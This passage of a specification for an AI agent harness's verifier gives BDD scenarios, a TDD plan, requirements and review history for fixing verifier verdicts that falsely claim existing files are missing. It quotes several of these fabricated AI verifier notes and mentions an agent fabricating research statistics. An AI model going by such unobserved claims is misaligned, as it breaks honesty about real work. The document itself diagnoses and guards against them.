- **Then** no `verifier:field-partial-drop` event MUST fire for `plan`
- **And** every story's `verifiers:` line MUST survive into `payload.plan`

#### Scenario: Continuation delivery is determined before it is called a failure
**Traces to**: User Story 10, Acceptance Scenario 1
**Category**: Error Path
- **Given** a dispatched continuation that the host accepts but whose turn is still streaming at 30 s
- **When** the timeout race elapses
- **Then** the harness MUST NOT log `gate:continuation-failed`
- **But** a genuine host refusal MUST still log it

#### Scenario: A single declared verifier mints a receipt
**Traces to**: User Story 11, Acceptance Scenario 1
**Category**: Happy Path
- **Given** story S1 declares 6 verifiers
- **When** the agent runs exactly one of them and it exits 0
- **Then** a receipt MUST be minted for that verifier
- **And** no `verify:relevance-gap` MUST fire for it

#### Scenario: Absolute observed path matches a relative declared verifier
**Traces to**: User Story 11, Acceptance Scenario 2
**Category**: Alternate Path
- **Given** the declared verifier is `test -f research/x.md` and the observed command is `test -f /root/ws/research/x.md` with `workspaceRoot=/root/ws`
- **When** coverage is evaluated
- **Then** they MUST match after normalisation

#### Scenario: An unrelated command still reports a relevance gap
**Traces to**: User Story 11, Acceptance Scenario 3
**Category**: Error Path
- **Given** an observed command covering none of the story's declared verifiers
- **When** coverage is evaluated
- **Then** `verify:relevance-gap` MUST still fire

#### Scenario: A verdict with zero tool calls is not applied
**Traces to**: User Story 12, Acceptance Scenario 1
**Category**: Error Path
- **Given** the verifier child session shows zero tool calls in its persisted parts
- **When** its verdict contains a `met:false` item
- **Then** the verdict MUST NOT be applied and `verifier:unverified` MUST be logged

#### Scenario: A veto-derived pass is not reported as verifier-verified
**Traces to**: User Story 1, FR-001b
**Category**: Edge Case
- **Given** a story whose pass was re-derived by the harness after contradicting every failing item
- **When** the plan close-out renders
- **Then** it MUST NOT claim the verifier "independently verified" that story
- **And** the stamp MUST carry `contradictedItemIds`

#### Scenario: A secret in the plan digest is still redacted after the cap raise
**Traces to**: User Story 6, Acceptance Scenario 3
**Category**: Edge Case
- **Given** a plan digest containing a line with a high-entropy secret
- **When** `buildVerifierPayload` runs
- **Then** that line MUST be dropped from `payload.plan`

#### Scenario: A story reverted past the cap escalates instead
**Traces to**: User Story 7, Acceptance Scenario 1
**Category**: Error Path
- **Given** story S1 has been verifier-reverted `maxStoryReaudits` times
- **When** a further audit returns `pass:false` for S1
- **Then** S1 MUST NOT be reverted
- **And** `verifier:reaudit-capped` MUST be logged
- **And** an operator health notification naming S1 MUST be emitted

#### Scenario: The cap never blocks a passing verdict
**Traces to**: User Story 7, Acceptance Scenario 2
**Category**: Alternate Path
- **Given** story S1 is at the re-audit cap
- **When** a later audit returns `pass:true` for S1
- **Then** the pass MUST be applied and stamped normally

#### Scenario: A user message resets the re-audit counter
**Traces to**: User Story 7, Acceptance Scenario 3
**Category**: Alternate Path
- **Given** story S1 is at the re-audit cap
- **When** a real user message arrives and a later audit returns `pass:false`
- **Then** the revert MUST proceed (counter reset by human re-engagement)

#### Scenario Outline: Re-audit cap boundary
**Traces to**: User Story 7, Acceptance Scenario 1
**Category**: Edge Case
- **Given** `maxStoryReaudits` is `<cap>` and story S1 has `<priorReverts>` prior reverts
- **When** an audit returns `pass:false` for S1
- **Then** the revert-suppressed result MUST be `<suppressed>`

| cap | priorReverts | suppressed |
|-----|--------------|------------|
| 3   | 0            | false      |
| 3   | 2            | false      |
| 3   | 3            | true       |
| 3   | 9            | true       |
| 0   | 9            | false      |
| -1  | 9            | false      |

#### Scenario: maxSteps cleanup is assertion-safe
**Traces to**: User Story 8, Acceptance Scenario 2
**Category**: Happy Path
- **Given** the host ignores `maxSteps` (proven by probe)
- **When** the agent registration is cleaned up
- **Then** no test MUST assert a resolved `maxSteps` value
- **And** the registration MUST either omit the field or carry a host-ignored comment

#### Scenario: Digest carries the absolute worktree root
**Traces to**: User Story 9, Acceptance Scenario 1
**Category**: Happy Path
- **Given** a session whose worktree is `/workspace/proj`
- **When** `renderPlanDigest` runs
- **Then** the digest MUST contain the literal absolute root `/workspace/proj`
- **And** every relative path in the digest MUST be resolvable against it

#### Scenario: A payload-only audit still observes the filesystem
**Traces to**: User Story 9, Acceptance Scenario 3
**Category**: Happy Path
- **Given** the P1 fixture — `research/x.json` exists with 3 KPIs, and the payload does NOT quote its contents
- **When** the full `runVerifier` path audits the story
- **Then** the verdict MUST be correct (not a fabricated "file does not exist")
- **And** the child session's persisted parts MUST contain ≥1 tool call

#### Scenario: The prompt forbids an unobserved met:false file claim
**Traces to**: User Story 9, Acceptance Scenario 2
**Category**: Error Path
- **Given** the verifier system prompt
- **When** it is assembled
- **Then** it MUST state that a `met:false` claim about a file's existence or contents requires a prior filesystem observation

---

## Test-Driven Development Plan

| Order | Test Name | Level | Traces to BDD Scenario | Description |
|---|---|---|---|---|
| 1 | `pathClaim: whitelisted negation forms are detected` | Unit | A contradicted path-existence claim is dropped | Clause-anchored discriminator |
| 2 | `pathClaim: "exists but contains no X" is KEPT` | Unit | A content-property claim is never dropped | The 3 correct-FAIL notes |
| 3 | `pathClaim: second negation blocks the drop` | Unit | A surviving content claim still reverts | C-3 rule 2 |
| 4 | `pathClaim: multi-path note drops only if ALL exist` | Unit | A contradicted path-existence claim is dropped | C-3 rule 4 |
| 5 | `pathClaim: corpus of 49 real notes matches expected labels` | Unit | (fixture) | tests/fixtures/verifier-replay/item-notes.json |
| 6 | `crossCheck: drops contradicted met:false items` | Unit | US1 AS4 | Pure verdict-filter function |
| 7 | `gate: passing verifiers suppress revert + log verifier:contradicted` | Integration | Passing verifiers veto | Full `handleVerifierAudit` |
| 8 | `gate: failing verifier still reverts` | Integration | Failing verifier lets FAIL through | Regression guard |
| 9 | `gate: no verifiers → unchanged behavior` | Integration | No-verifiers story | Regression guard |
| 10 | `story: concurrent engines both keep stamps` | Integration | Concurrent instances | Two engines, one stateDir |
| 11 | `story: re-hydrate before mutate` | Unit | US2 AS2 | Disk newer than cache |
| 12 | `story: corrupt file still aborts write` | Unit | Corrupt plan file | Existing behavior preserved |
| 13 | `story: re-checkpoint complete is a no-op` | Unit | Re-checkpointing is a no-op | Byte-identical file |
| 14 | `story: pending task still errors` | Unit | Completing a pending task | Regression guard |
| 15 | `story: no-op does not clear failing stamp` | Unit | No-op does not launder | E8 |
| 16 | `story: reopened+recompleted sets completedAt` | Unit | Reopened story audited again | FR-004 |
| 17 | `gate: reopened+recompleted story is selected` | Integration | Reopened story audited again | Audit selector |
| 18 | `verifier: pass:false + all met is malformed` | Unit | pass:false all met | Shape check |
| 19 | `verifier: pass:false + empty items accepted` | Unit | Empty items accepted | Shape check |
| 20 | `verifier: 6425-char plan transmits whole` | Unit | Plan digest transmits whole | Cap raise |
| 21 | `verifier: secret in plan still redacted` | Unit | Secret still redacted | Redaction preserved |
| 22 | `evaluateReaudit: cap boundary table` | Unit | Re-audit cap boundary | Pure function, 6 rows |
| 23 | `gate: capped story escalates not reverts` | Integration | Reverted past the cap | Health notification |
| 24 | `gate: cap never blocks a pass` | Integration | Cap never blocks a pass | Progress preserved |
| 25 | `gate: user message resets counter` | Integration | User message resets | `resetTurnState` |
| 26 | `config: maxSteps assertion removed / annotated` | Unit | maxSteps cleanup is assertion-safe | No test asserts a host-ignored value |
| 27 | `gate: plan digest carries the absolute worktree root` | Unit | Digest carries the absolute worktree root | `renderPlanDigest` |
| 28 | `verifier prompt: demands a filesystem observation before met:false` | Unit | Payload-only audit still observes the filesystem | Prompt-content assertion + live P1 re-run (manual) |
| 21a | `verifier: plan verifier lines survive the scan` | Unit | Plan-contract lines are not silently scan-dropped | No `verifier:field-partial-drop` for `plan` |
| 29 | `gate: streaming turn is not logged as continuation-failed` | Integration | Continuation delivery is determined | FR-012; genuine refusal still logs |
| 30 | `coverage: one declared verifier of many mints a receipt` | Unit | A single declared verifier mints a receipt | FR-013 |
| 31 | `coverage: absolute observed path matches relative declared` | Unit | Absolute observed path matches a relative declared verifier | FR-013 normalisation |
| 32 | `gate: veto-derived pass is not reported as verifier-verified` | Integration | A veto-derived pass is not reported as verifier-verified | FR-001b |
| 33 | `story: clearPlan/createPlan are not resurrected by a merge` | Unit | (FR-002a) | mutate modes |
| 34 | `story: checkpoint does not deadlock on the archival lock` | Unit | (FR-002b) | archiveV1IfPresent hoist |
| 35 | `story: lock contention retries then aborts without throwing` | Unit | (FR-002c) | FR-010 |
| 36 | `story: a revision-less plan.json still loads` | Unit | (FR-002d) | back-compat |
| 37 | `gate: zero-tool-call verdict is verifier:unverified` | Integration | A verdict with zero tool calls is not applied | FR-014 |

### Dataset: Path-claim discrimination (built from the 49 recovered real notes)

Committed as `tests/fixtures/verifier-replay/item-notes.json` (49 unique notes, 36 `keep` / 13 `drop`). Representative rows:

| # | Note (real text, truncated) | Class | Expected | Traces to |
|---|---|---|---|---|
| 1 | `research/renewable-energy.md exists (1046 bytes) but contains no URLs or Sources section` | content + path token, CORRECT FAIL | **keep** | A content-property claim is never dropped |
| 2 | `renewable-energy.md and space-exploration.md are MISSING on disk` | path negation, file exists | **drop** | A contradicted path-existence claim is dropped |
| 3 | `the research/ directory does not exist in /workspace/vertextest2` | path negation, dir exists | **drop** | A contradicted path-existence claim is dropped |
| 4 | `No src/App.tsx, src/App.jsx, src/main.tsx, or src/main.jsx` | multi-path, 2 exist / 2 do not | **keep** | C-3 rule 4 (not all exist) |
| 5 | `Declared verifier \`test -f package.json\` would fail` | path inside a quoted command | **keep** | C-3 rule 5 |
| 6 | `data is hardcoded as inline energyData arrays; no import of the json file` | content only | **keep** | A content-property claim is never dropped |


### Dataset: Checkpoint idempotency

| # | Task status | Action | Boundary type | Expected | Traces to |
|---|---|---|---|---|---|
| 1 | `complete` | complete | Repeat | No-op success, session entry deep-equal | Re-checkpointing is a no-op |
| 2 | `active` | complete | Happy | Completes normally | (existing coverage) |
| 3 | `pending` | complete | Error | Throws "not active" | Completing a pending task |
| 4 | `blocked` | complete | Error | Throws "not active" | US3 AS3 |
| 5 | `failed` | complete | Error | Throws "not active" | US3 AS3 |
| 6 | `complete` (story verifier FAIL) | complete | Edge | No-op; stamp untouched | No-op does not launder |

### Dataset: Plan digest

| # | Digest length | Boundary type | Expected | Traces to |
|---|---|---|---|---|
| 1 | 7518 (measured, audited plan) | Real value | Whole, no truncate, no partial-drop | Digest transmits whole |
| 2 | new cap + 1 | Just above cap | Truncated + logged | US6 AS2 |
| 3 | contains a real secret | Security | Secret line dropped | Secret still redacted |
| 4 | pair whose join fuses into a 33-char token | Regression (M-10) | Both lines KEPT | Plan-contract lines are not silently scan-dropped |

### Regression Test Requirements

Modifies existing functionality. MUST be preserved:

1. **C-11 invariant** — a blocked dependency holds its dependents pending (`tests/v2/story.test.ts`, UAT `T1-blocked-predecessor-holds-successor-pending`).
2. **Thrown `checkpoint` leaves the session's plan entry unchanged** (see M-8: "byte-identical" relaxed to deep-equal once `mutate` lands).
3. **Fail-open verifier** — `unsupported`/`unavailable`/`malformed` never throw into the host.
4. **Existing revert behavior** for genuinely-failing stories.
5. **1379 vitest tests + all UAT scenarios** continue to pass (baseline re-confirmed by the round-2 grill: 1379 passed, 43 files).

New regression guards: TDD tests 2, 3, 12, 14, plus the 49-note corpus (test 5).

---

## Functional Requirements

- **FR-001** *(P2, re-ranked round 2)*: Before applying verdicts, the harness MUST drop any verifier item whose `met:false` note asserts the non-existence of a path that exists inside the session `workspaceRoot`, verified with `fs.existsSync` and **no command execution**, using the clause-anchored discriminator specified in User Story 1; if every `met:false` item of a story is dropped, `pass` MUST be re-derived as `true`. Content-property claims MUST never be dropped.
- **FR-001a**: The harness MUST NOT execute any string originating from `plan.json` (`verifiers` or otherwise).
- **FR-001b** *(added round 2, M-15)*: A veto-derived pass MUST remain distinguishable from a genuine verifier pass — the stamp MUST retain the original items plus a `contradictedItemIds` marker, and the plan close-out MUST NOT claim the verifier "independently verified" a story whose pass was harness-derived.
- **FR-002**: `StoryEngine` MUST route every plan mutation through a private `mutate(sessionID, fn, mode)` seam that acquires the state lock **once**, re-reads `plan.json`, reconciles it with the cached plan **in place** (preserving object identity — `gate.ts:742-753` depends on it), applies `fn`, writes, and releases. `persistPlan` becomes a lock-free inner call used only by `mutate`.
  - **FR-002a** *(round 2, M-5)*: `mutate` MUST support three modes — `merge` (default), `replace` (`createPlan`), `delete` (`clearPlan`) — because merging on-disk state into a cleared or replaced plan would resurrect deleted stories.
  - **FR-002b** *(round 2, M-5)*: `archiveV1IfPresent` acquires the SAME non-reentrant lock and is called at the top of `createPlan`/`checkScope`/`checkpoint`; it MUST be hoisted above every `mutate` call or given a lock-free inner variant, or `checkpoint` will deadlock-throw into the host.
  - **FR-002c** *(round 2, M-5)*: `acquireStateLock` throws rather than waits. `mutate` MUST retry with bounded jittered backoff and, on exhaustion, log and abort the write — never throw into the host (FR-010). **Amended during implementation (code review MIN-005):** the retry COUNT stays 5, but the unit dropped 100 ms → 6 ms with a hard `MUTATE_LOCK_MAX_BLOCK_MS = 50` clamp on the total, because `lockIO.sleep` uses `Atomics.wait` on the main thread and the original bound blocked the shared host event loop for up to ~750 ms inside a synchronous tool call. Trade-off, accepted: a peer critical section longer than ~45 ms now aborts the write rather than being waited out — the critical section is single-digit ms in practice, an aborted write still applies in memory and re-persists on the next mutation (`revision` keeps the merge ordered), and a lock held longer than that usually means a crashed peer (reclaimed as stale at 30 s by `pin.ts`).
  - **FR-002d** *(round 2, M-6)*: the `revision` counter that triggers `plan:concurrent-merge` MUST be persisted in `PlanV2` with a documented back-compat coercion for revision-less files (mirroring the `dependsOn` coercion at `story.ts:1367-1376`) and accepted by `isPlanV2`.
- **FR-003**: `checkpoint(taskId, "complete")` on an already-`complete` task MUST succeed as a no-op without mutating plan state, and the tool response MUST still report the currently-active task ids (round 2, m-16: the error string was the only corrective signal). `mutate` MUST skip the disk write when `fn` reports no change.
- **FR-004** *(corrected round 2, M-7)*: A story reopened while `complete` MUST become audit-eligible **immediately**, with no further checkpoint. The mechanism MUST be named explicitly: `reopenStory` stamps a fresh `completedAt` when the derived status is still `complete`. FR-003's no-op is explicitly **not** the mechanism (the observed case has no incomplete task to re-checkpoint).
- **FR-005** *(P1, re-ranked round 2; behavior fixed per M-9)*: A story verdict where `pass === false` and every listed item has `met === true` MUST be **dropped per story** in `handleVerifierAudit`'s verdict filter (`gate.ts:726`) — NOT in `isVerifierVerdictShape`, which is a whole-payload boolean — leaving the story untouched, logging `verifier:verdict-contradictory`, and counting toward FR-007's cap. Sibling story verdicts MUST still apply. Repair (manufacturing a pass) is explicitly rejected.
- **FR-006**: The plan digest MUST reach the verifier complete. Cap set from the **measured raw length (7518 chars for the audited 6-story plan)** — ≥16000 for headroom. Truncation above the cap MUST still occur and be logged. Audited stories MUST render first.
- **FR-006a** *(root cause reproduced, round 2 M-10)*: `scanUnits`' adjacent-pair check MUST NOT drop two clean units because concatenating them **with no separator** manufactures a high-entropy token. A pair may be dropped only when the offending match **straddles the join index**. Fix in `scanUnits`; applies to all five fields; preserves C-9's wrapped-secret guarantee. Exempting the digest is forbidden (contradicts US6 AS3).
- **FR-007**: Cap consecutive verifier reverts per story; at the cap, escalate to the operator instead of reverting. Counter lives in `V2SessionState`, resets on a real user message. Contradictory verdicts (FR-005) count toward it.
- **FR-008** *(P3)*: Remove or annotate the host-ignored `maxSteps` registration; no test may assert a resolved value the host does not honour.
- **FR-009**: Distinct log events for every skip/contradiction/no-op/merge/cap: `verifier:contradicted`, `verifier:crosscheck-inconclusive`, `verifier:verdict-contradictory`, `verifier:unverified`, `checkpoint:idempotent-noop`, `plan:concurrent-merge`, `verifier:reaudit-capped`.
- **FR-010**: No change may throw into the host; every new failure path degrades to pre-fix behavior.
- **FR-011** *(P0 — the primary fix)*: The plan digest MUST state the absolute worktree root, and the verifier system prompt MUST require a filesystem observation before any `met:false` claim about a file's existence or contents. The current prompt only demands observation before crediting (`verifier.ts`: *"Read the files a claim references before crediting it"*) — the negative direction is unconstrained, which is the gap.
- **FR-012** *(widened round 2, M-13)*: `session.prompt` resolves only when the whole assistant turn ends, so the 30 s race times out on every non-trivial continuation — the 9 `gate:continuation-failed` events are mislogged, and the continuations **were** delivered (each appears as a user message the agent reacts to). The harness MUST stop reporting a still-streaming turn as a failure, AND MUST NOT release `state.idleContinuationInFlight` at the timeout (`gate.ts:182`) while the turn is still streaming — `gate.ts:835` documents that flag as the only guard against a continuation echoing itself.
- **FR-013**: Verifier-coverage matching MUST credit a story's declared verifiers **individually** (not as one `&&`-joined prescription) and MUST normalise absolute vs relative paths against `workspaceRoot`, so running a declared verifier actually mints a receipt.
- **FR-014** *(added round 2, M-14)*: The harness MUST require **≥1 tool call in the verifier child session** before applying any `met:false`; otherwise the verdict is `verifier:unverified` — logged, not applied. This is the only deterministic floor that covers **content** claims (29 of 49 notes), which FR-001 cannot touch. Readable in-process: the child session's parts via `client.session.messages` before `subturn.ts`'s `finally` deletes it.

## Success Criteria

- **SC-001a** *(deterministic)*: against `tests/fixtures/verifier-replay/item-notes.json` (49 real recovered notes, 36 `keep` / 13 `drop`), the discriminator matches the labelled `expected` for **all 49**, and the 13 path fabrications produce **0 reverts**. *(Corrected 2026-08-03: the earlier 42/7 figure predates the filesystem-ground-truth relabelling of the fixture.)*
- **SC-001b** *(measured, not asserted)*: on the live P1 probe with the FR-011 prompt+digest, the verifier makes ≥1 tool call and does not fabricate. An expectation about a model, stated as such.
- **SC-002**: the 3 real correct-FAIL notes are labelled `keep` and still produce a revert — the discriminator cannot suppress a correct FAIL. Uses the REAL recovered strings, so the test cannot be tuned to the matcher.
- **SC-003**: a two-engine concurrent-write test ends with **both** stamps present (0 lost updates).
- **SC-004**: re-checkpointing every already-complete task in a 10-task plan yields **0 thrown errors** (vs 23/82 observed).
- **SC-005**: a story reopened while `complete` is audit-eligible immediately, in 100% of trials, with no further checkpoint.
- **SC-006**: 0 `verifier:field-truncated` for `plan` on the 7518-char fixture.
- **SC-006b**: 0 `verifier:field-partial-drop` for `plan` on the same fixture (round 2, M-11).
- **SC-007**: a story disputed N+1 times produces exactly `maxStoryReaudits` reverts and 1 escalation.
- **SC-008**: **≥1379 vitest tests pass**, all UAT scenarios pass, `tsc --noEmit` clean.
- **SC-009**: ✅ MET — FR-008 probe recorded in Findings (hypothesis disproven).
- **SC-010**: re-running P1 after FR-011/FR-014 yields a correct verdict and ≥1 tool call, versus the pre-fix fabricated `pass:false` in 9.8 s.
- **SC-011** *(FR-014)*: a verifier verdict produced with 0 tool calls is logged `verifier:unverified` and applies 0 reverts.

## Traceability Matrix

| Requirement | User Story | BDD Scenario(s) | Test Name(s) |
|---|---|---|---|
| FR-001 | US-1 | A contradicted path-existence claim is dropped; All items contradicted re-derives a pass; A surviving content claim still reverts; A content-property claim is never dropped; An unresolvable path check is inconclusive | 1–5, 6–9 |
| FR-001a | US-1 | No command from plan.json is ever executed | 5 |
| FR-001b | US-1 | A veto-derived pass is not reported as verifier-verified | 32 |
| FR-002 | US-2 | Concurrent instances both keep stamps; Corrupt plan file still aborts | 10, 11, 12 |
| FR-002a | US-2 | clearPlan/createPlan are not resurrected by a merge | 33 |
| FR-002b | US-2 | checkpoint does not deadlock on the archival lock | 34 |
| FR-002c | US-2 | Lock contention retries then aborts without throwing | 35 |
| FR-002d | US-2 | A revision-less plan.json still loads | 36 |
| FR-003 | US-3 | Re-checkpointing is a no-op; Completing a pending task; No-op does not launder | 13, 14, 15 |
| FR-004 | US-4 | Reopened story audited again; Reopened-then-blocked not audited | 16, 17 |
| FR-005 | US-5 | pass:false all met is dropped per story; siblings still apply | 18, 19 |
| FR-006 | US-6 | 7518-char digest transmits whole; Secret still redacted | 20, 21 |
| FR-006a | US-6 | Plan-contract lines are not silently scan-dropped | 21a |
| FR-007 | US-7 | Reverted past the cap escalates; Cap never blocks a pass; User message resets; Re-audit cap boundary | 22, 23, 24, 25 |
| FR-008 | US-8 | maxSteps cleanup is assertion-safe | 26 |
| FR-009 | US-1,2,3,5,7 | Logging assertions embedded above | 7, 10, 13, 18, 23 |
| FR-010 | US-1..7 | An unresolvable path check is inconclusive; Corrupt plan file | 5, 12, 35 |
| FR-011 | US-9 | Digest carries the absolute worktree root; Payload-only audit still observes the filesystem; The prompt forbids an unobserved met:false file claim | 27, 28 |
| FR-012 | US-10 | Continuation delivery is determined before it is called a failure | 29 |
| FR-013 | US-11 | A single declared verifier mints a receipt; Absolute observed path matches a relative declared verifier; An unrelated command still reports a relevance gap | 30, 31 |
| FR-014 | US-12 | A verdict with zero tool calls is not applied | 37 |

## Ambiguity Warnings

| # | What's ambiguous | Resolution | Status |
|---|---|---|---|
| A1 | Plan digest cap | **RESOLVED**: measured raw digest = 7518 chars; cap ≥16000. | Resolved |
| A2 | `maxStoryReaudits` default | **RESOLVED round 2 (m-21)**: 3 — provably effective; only one user message interleaved the 9 cycles, after which S1 was reverted 7 consecutive times, so a cap of 3 saves 4 cycles. Env-overridable. | Resolved |
| A3 | Per-verifier timeout | **RESOLVED / moot**: nothing is executed (FR-001a). | Resolved |
| A4 | Verifier→item mapping | **RESOLVED by re-scope**: impossible (no schema mapping); replaced by clause-anchored path discrimination. | Resolved |
| A5 | Can the veto manufacture a pass | Only when every failing item was individually disproven, and it is marked as harness-derived (FR-001b). | Resolved |
| A6 | FR-008 fallback | **RESOLVED by probe**: verifier tool-calls fine; `maxSteps` inert. | Resolved |
| A7 | FR-012 outcome | **RESOLVED by artifact (M-13)**: continuations WERE delivered; the timeout is structural. Scope widened to the guard release. | Resolved |

**GATE**: no open ambiguities remain. All seven were closed with evidence rather than deferred.

## Rejected Alternatives (FR-001)

| Alternative | Why rejected | Evidence |
|---|---|---|
| Execute declared `verifiers`, veto on all-pass *(original FR-001)* | Unsound (verifiers pass on a sourceless stub — a correct FAIL), inoperative (6/6 stories had an "unreliable" verifier under the cited rule), unsafe (LLM-authored strings → RCE). | Round-1 C1/C2/C3 |
| Cross-check against `VerificationReceiptStore` | Empirically inert: no `receipts.json`, 0 mint events, 146 `verify:relevance-gap` suppressions. Root cause is now FR-013. | Round-1 C6, C6b |
| Fix the reliability classifier and keep execute-and-veto | Would make it operative but leaves it unsound and unsafe. | C1 table col 5 |
| Rely on FR-011 alone | FR-011 is the primary fix but is prompt-level with no hard floor; FR-001 (path) + FR-014 (tool-call floor) provide deterministic floors. | C-1, M-14 |

## Assumptions

1. ~~Verifiers are author-declared and already executed by the agent~~ **WITHDRAWN (round 1, C3)** — they are LLM-authored, and the harness now executes nothing.
2. The session's `workspaceRoot` (`wiring/state.ts:45`) is the correct root for **path resolution** (round 2, m-20: no longer "for verifier execution").
3. The two-instance condition was operator-induced, but the silent data loss is a harness defect regardless.
4. `plan.json` remains a single shared file.

## Out of Scope

- Redesigning the verifier prompt wholesale or switching verifier models.
- Per-session plan files or a database.
- The agent-behavior findings from the ground-truth audit (fabricated research statistics, hidden broken charts).
- Under-decomposition (6 stories → 10 tasks) — a prompt concern.

## Holdout Evaluation Scenarios

> **HOLDOUT — not referenced in the traceability matrix.** Post-implementation verification only.

- **H1**: fresh multi-story session where every story is genuinely delivered → zero reverts, zero escalations, plan reaches all-complete.
- **H2**: deliver 2 of 3 stories, third genuinely incomplete → exactly one revert, naming the right story.
- **H3**: two opencode instances on one session → final `plan.json` has a stamp for every audited story, none missing.
- **H5**: force the verifier to return prose → `verifier:malformed`, claims stand, no loop.
- **H6**: hand-write a `complete` story with a stale failing stamp → it is re-audited, not silently trusted or skipped.
- **H7** *(rewritten round 2)*: a story whose declared verifiers pass but whose acceptance items are genuinely unmet (stub file) → the harness does NOT auto-pass it; the content FAIL still applies. Confirms the path discriminator never blesses content.
- **H8** *(new)*: a verifier run that makes zero tool calls → `verifier:unverified`, no revert applied (FR-014).

---

## Grill history — what changed and the evidence that forced it

Two adversarial review rounds, both returning FAIL. Every material finding was **independently re-verified against real artifacts** before being accepted; findings that did not survive verification are recorded as rejected.

### Round 1 (accepted)

- **C1 — the original FR-001 was inoperative.** Ran the cited reliability regex (`hasReliableAggregateExit`, `src/index.ts:1140`) over the real `plan.json` verifiers: **6/6 stories had ≥1 "unreliable" verifier**, so the proposed veto could never fire. Causes: `jq -e '.kpis | length >= 3'` trips on a `|` **inside quotes**; `test -f a.tsx || test -f a.jsx` is rejected though `||` is the intent. A quote-aware classifier that treats `||` as reliable yields 0 unreliable for all 6 — recorded, but moot after C2/C3.
- **C2 — "verifiers only veto, never bless" was a word game.** S1's verifiers prove existence only; A2/A4/A6 require cited sources. Ran S1/S2's verifiers live: **all exit 0** on files that were one of the 3 CORRECT FAILs. A story-level veto would have suppressed a correct revert.
- **C3 — it was an unbudgeted RCE surface.** `verifiers` are LLM-authored (`tools.ts:324`), validated only as `isStringArray` (`story.ts:346`), in an ordinary file. Executing them unattended would bypass the verifier's own sandbox. **Resolution: execute nothing (FR-001a).**
- **C4 — FR-002's mechanism could not work.** Mutations are applied before the lock (`story.ts:997-1018` then persist at `:1023`); `hydrateFromDisk` sets the cache (`:1377`), so re-hydrating inside `persistPlan` discards the caller's own write. `acquireStateLock` is non-reentrant. `gate.ts:742-753` documents a load-bearing object-identity assumption.
- **C5 — SC-001/SC-002 were unmeasurable** as originally written (only the latest stamp survives; the audit log stores id arrays; subturn sessions are deleted).
- **C6 / C6b — the receipt alternative was inert, and why.** No `receipts.json`, 0 mint events. Root cause found: `prescribed = storyVerifiers.join(" && ")` (`plugin.ts:896`) + `prescribedParts.every(...)` (`coverage.ts:1097`) require ONE command to cover ALL of a story's verifiers → 146 `verify:relevance-gap`, 0 receipts. Became **FR-013**.
- **C7 — 9 `gate:continuation-failed`** timeouts, unexamined. Became FR-012.
- **Rejected**: "FR-008 should gate the spec" — the probe had already completed and **disproved** the `maxSteps` hypothesis.

### Round 2 (accepted)

- **C-1 — FR-001's coverage was overstated; re-ranked P0 → P2.** Recovered all **49 item notes** from the transcript: **15 path-negation, 29 content-only, 5 mixed**; only **3 of 22** recoverable reverts were pure path-fabrication. FR-011 is now P0, FR-005 P1.
- **C-2 — SC-001 contradicted US1 AS4** (it demanded 0 reverts on a content-class fixture FR-001 is forbidden to drop). Split into SC-001a (deterministic) / SC-001b (measured).
- **C-3 — the extraction algorithm was unspecified and is NOT regex-tractable.** The corpus's own first notes are the trap: `"research/renewable-energy.md exists (1046 bytes) but contains no URLs or Sources section"` — path token + negation, on a CORRECT FAIL. Replaced with a clause-anchored whitelist plus a committed 49-note corpus (`tests/fixtures/verifier-replay/item-notes.json`) that fails the build if a matcher drops a correct-FAIL note.

  **Label correction during implementation (code review MAJ-002).** The corpus was first labelled **42 keep / 7 drop** by a text heuristic I wrote at spec time. Implementing FR-001 showed that heuristic was wrong: it labelled textbook fabrications like `"research/renewable-energy.json does not exist on disk"` as *keep*, and `"…climate-indicators.md missing."` as *keep*, purely because of surface wording. The labels were therefore **re-derived from filesystem ground truth** — a note is `drop` only when it predicates absence, makes no content claim, and **every path it names actually exists in the audited worktree** — giving **36 keep / 13 drop**. That layout is itself now committed (`worktree-layout.json`) so the derivation is reproducible. The anti-tuning property M-12 asked for is preserved and strengthened: the labels come from the filesystem, not from the matcher, and the three correct-FAIL notes remain `keep`.
- **C-4 — the withdrawn execution design survived in five normative sections.** Purged: Behavioral Contract bullets, E1/E2/E4, TDD tests 1–5, the verifier dataset, H4/H7, Assumption 2, and FR-001's matrix row.
- **M-5/M-6 — FR-002 would break `clearPlan`/`createPlan` and deadlock `checkpoint`** via `archiveV1IfPresent`'s use of the same non-reentrant lock. Became FR-002a–d.
- **M-7 — FR-003 and FR-004 contradicted each other** on the observed `complete → complete` reopen (nothing to re-checkpoint). FR-004 now names `reopenStory` as the mechanism.
- **M-9 — FR-005 contradicted its own BDD/US/Symbols.** Now: drop per story in `gate.ts:726`, not `isVerifierVerdictShape`; repair explicitly rejected.
- **M-10 — FR-006a's evidence was wrong and I reproduced the true root cause.** Per-field counts are **11 plan partial-drops / 11 plan truncations** (not 23:13 — that conflated all fields). Reproducing `buildVerifierPayload` against the real digest gives `{plan, kept:51, dropped:4}` **exactly**, and the dropped lines are S1/S2/S3's `verifiers:` lines. Isolated the mechanism: `scanUnits` concatenates adjacent units **with no separator**, fusing `…space-exploration.json` + `S2` into the 33-char token `research/space-exploration.jsonS2`, which clears the 3.95 bits/char entropy rule — **neither line trips alone**. Fix: require the offending match to straddle the join.
- **M-12 — the real verdict text WAS recoverable.** 49 notes extracted from the transcript and committed as the fixture corpus, so the tests cannot be tuned to the matcher.
- **M-13 — FR-012 understated the defect.** The continuations **were** delivered (each appears as a user message the agent reacts to); `session.prompt` resolves only at turn end, so the 30 s race always times out. The real harm is the `finally` at `gate.ts:182` releasing `idleContinuationInFlight` mid-stream — the documented sole guard against a continuation echoing itself.
- **M-14 — added FR-014**, a tool-call floor: the only deterministic protection for **content** claims (29 of 49 notes), which FR-001 cannot touch by construction.
- **M-15 — added FR-001b**: a veto-derived pass must not be reported as "the verifier independently verified".
- **m-19 — measured the raw digest at 7518 chars**; the `originalLength: 6411-6425` in the events is post-scan. FR-006's cap is set from the measured value.

### Measurement errors I made and corrected

- Claimed the verifier made "zero tool calls" from the SDK response payload. **Wrong** — the response returns only the final step's parts. The persisted `part` rows show 3 steps and 2 real tool calls. Any future probe must read the DB.
- Claimed partial-drop outnumbered truncation 23:13. **Wrong** — that conflated all five fields; for `plan` it is 11:11.
- Claimed "every fabricated revert was a path-existence claim". **Wrong** — 29 of 49 notes are content-only.

---

## Findings (FR-008 — RESOLVED by live probe, 2026-08-03)

**The `maxSteps` hypothesis is DISPROVEN. The verifier's tools work.**

| # | Probe | Observed |
|---|---|---|
| P1 | Full `runVerifier` (dist), payload only | **Reproduced the production failure in 9.8 s**: `pass:false`, *"research/x.json does not exist… ls shows no research/ directory"* — while the file existed |
| P2 | Direct `session.prompt` naming the item | Correct verdict |
